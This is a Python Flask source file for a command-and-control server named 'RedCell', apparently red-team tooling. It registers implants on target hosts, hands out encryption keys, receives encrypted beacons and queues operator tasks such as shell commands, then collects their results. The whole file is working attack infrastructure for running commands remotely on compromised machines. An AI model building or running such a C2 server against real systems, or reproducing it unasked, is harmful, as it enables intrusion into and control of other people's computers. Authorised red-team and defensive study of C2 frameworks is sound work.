"""
RedCell C2 Server

RESTful C2 server with encrypted communications for managing implants.
"""

import sys
import argparse
from pathlib import Path
from flask import Flask, request, jsonify
from flask_cors import CORS

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from c2.server.crypto import C2Crypto, generate_implant_key
from c2.server.tasking import TaskingManager, TaskStatus
from utils.logger import setup_logging
from utils.config import load_config


# Initialize Flask app
app = Flask(__name__)
CORS(app)  # Enable CORS for testing

# Global instances
tasking_manager = TaskingManager()
crypto_handler = None
logger = None
config = None


@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint."""
    return jsonify({'status': 'online', 'version': '1.0.0'}), 200


@app.route('/api/register', methods=['POST'])
def register_implant():
    """
    Register a new implant.

    Expected JSON payload:
    {
        "hostname": "target-host",
        "username": "current-user",
        "ip_address": "192.168.1.100",
        "operating_system": "Linux 5.15.0",
        "metadata": {}  # optional
    }
    """
    try:
        data = request.get_json()

        if not data:
            return jsonify({'error': 'No data provided'}), 400

        required_fields = ['hostname', 'username', 'ip_address', 'operating_system']
        for field in required_fields:
            if field not in data:
                return jsonify({'error': f'Missing required field: {field}'}), 400

        # Generate encryption key for this implant
        encryption_key = generate_implant_key()

        # Register implant
        implant_id = tasking_manager.register_implant(
            hostname=data['hostname'],
            username=data['username'],
            ip_address=data['ip_address'],
            operating_system=data['operating_system'],
            encryption_key=encryption_key,
            metadata=data.get('metadata', {})
        )

        logger.info(f"New implant registered: {implant_id} ({data['hostname']})")

        return jsonify({
            'implant_id': implant_id,
            'encryption_key': encryption_key,
            'beacon_interval': config.c2.beacon_interval,
            'beacon_jitter': config.c2.beacon_jitter
        }), 201

    except Exception as e:
        logger.error(f"Error registering implant: {e}")
        return jsonify({'error': 'Internal server error'}), 500


@app.route('/api/beacon/<implant_id>', methods=['POST'])
def beacon(implant_id):
    """
    Beacon endpoint for implants to check in.

    Expected JSON payload (encrypted):
    {
        "status": "alive",
        "results": []  # completed task results
    }
    """
    try:
        # Update last seen
        if not tasking_manager.update_implant_checkin(implant_id):
            return jsonify({'error': 'Implant not found'}), 404

        implant = tasking_manager.get_implant(implant_id)
        if not implant:
            return jsonify({'error': 'Implant not found'}), 404

        # Get encrypted data
        encrypted_data = request.get_json()
        if not encrypted_data:
            return jsonify({'error': 'No data provided'}), 400

        # Decrypt beacon data
        crypto = C2Crypto.from_b64_key(implant.encryption_key)
        beacon_data = crypto.decrypt_json(encrypted_data)

        # Process task results if any
        if 'results' in beacon_data:
            for result in beacon_data['results']:
                tasking_manager.complete_task(
                    task_id=result['task_id'],
                    result=result.get('result'),
                    error=result.get('error')
                )
                logger.info(f"Task {result['task_id']} completed by {implant_id}")

        # Get pending tasks
        pending_tasks = tasking_manager.get_pending_tasks(implant_id)

        # Prepare response
        response_data = {
            'tasks': [task.to_dict() for task in pending_tasks],
            'beacon_interval': config.c2.beacon_interval
        }

        # Encrypt response
        encrypted_response = crypto.encrypt_json(response_data)

        return jsonify(encrypted_response), 200

    except Exception as e:
        logger.error(f"Error processing beacon from {implant_id}: {e}")
        return jsonify({'error': 'Internal server error'}), 500


@app.route('/api/task', methods=['POST'])
def create_task():
    """
    Create a new task for an implant (operator use).

    Expected JSON payload:
    {
        "implant_id": "uuid",
        "command": "shell",
        "arguments": {"cmd": "whoami"}
    }
    """
    try:
        data = request.get_json()

        if not data:
            return jsonify({'error': 'No data provided'}), 400

        required_fields = ['implant_id', 'command']
        for field in required_fields:
            if field not in data:
                return jsonify({'error': f'Missing required field: {field}'}), 400

        task_id = tasking_manager.create_task(
            implant_id=data['implant_id'],
            command=data['command'],
            arguments=data.get('arguments', {})
        )

        if task_id is None:
            return jsonify({'error': 'Implant not found'}), 404

        logger.info(f"Task {task_id} created for implant {data['implant_id']}: {data['command']}")

        return jsonify({'task_id': task_id}), 201

    except Exception as e:
        logger.error(f"Error creating task: {e}")
        return jsonify({'error': 'Internal server error'}), 500


@app.route('/api/implants', methods=['GET'])
def list_implants():
    """List all registered implants."""
    try:
        implants = tasking_manager.get_all_implants()
        return jsonify({
            'implants': [implant.to_dict() for implant in implants],
            'count': len(implants)
        }), 200

    except Exception as e:
        logger.error(f"Error listing implants: {e}")
        return jsonify({'error': 'Internal server error'}), 500


@app.route('/api/implants/active', methods=['GET'])
def list_active_implants():
    """List active implants (checked in recently)."""
    try:
        timeout = request.args.get('timeout', default=300, type=int)
        implants = tasking_manager.get_active_implants(timeout_seconds=timeout)
        return jsonify({
            'implants': [implant.to_dict() for implant in implants],
            'count': len(implants)
        }), 200

    except Exception as e:
        logger.error(f"Error listing active implants: {e}")
        return jsonify({'error': 'Internal server error'}), 500


@app.route('/api/implant/<implant_id>', methods=['GET'])
def get_implant(implant_id):
    """Get details for a specific implant."""
    try:
        implant = tasking_manager.get_implant(implant_id)
        if not implant:
            return jsonify({'error': 'Implant not found'}), 404

        tasks = tasking_manager.get_implant_tasks(implant_id)

        return jsonify({
            'implant': implant.to_dict(),
            'tasks': [task.to_dict() for task in tasks],
            'task_count': len(tasks)
        }), 200

    except Exception as e:
        logger.error(f"Error getting implant details: {e}")
        return jsonify({'error': 'Internal server error'}), 500


@app.route('/api/task/<task_id>', methods=['GET'])
def get_task(task_id):
    """Get details for a specific task."""
    try:
        task = tasking_manager.get_task(task_id)
        if not task:
            return jsonify({'error': 'Task not found'}), 404

        return jsonify(task.to_dict()), 200

    except Exception as e:
        logger.error(f"Error getting task details: {e}")
        return jsonify({'error': 'Internal server error'}), 500


def main():
    """Main entry point for C2 server."""
    global crypto_handler, logger, config

    parser = argparse.ArgumentParser(description='RedCell C2 Server')
    parser.add_argument('--host', default='127.0.0.1', help='Host to bind to')
    parser.add_argument('--port', type=int, default=8443, help='Port to bind to')
    parser.add_argument('--config', help='Path to configuration file')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    args = parser.parse_args()

    # Load configuration
    config = load_config(args.config)

    # Override with command line args
    if args.host:
        config.c2.host = args.host
    if args.port:
        config.c2.port = args.port

    # Setup logging
    logger = setup_logging(
        name='c2-server',
        log_level='DEBUG' if args.debug else config.log_level,
        log_file='c2/server/logs/c2_server.log'
    )

    # Initialize crypto handler with generated key
    crypto_handler = C2Crypto()
    logger.info(f"C2 Server starting on {config.c2.host}:{config.c2.port}")
    logger.info(f"Master encryption key: {crypto_handler.get_key_b64()}")

    # Start Flask server
    app.run(
        host=config.c2.host,
        port=config.c2.port,
        debug=args.debug,
        threaded=True
    )


if __name__ == '__main__':
    main()
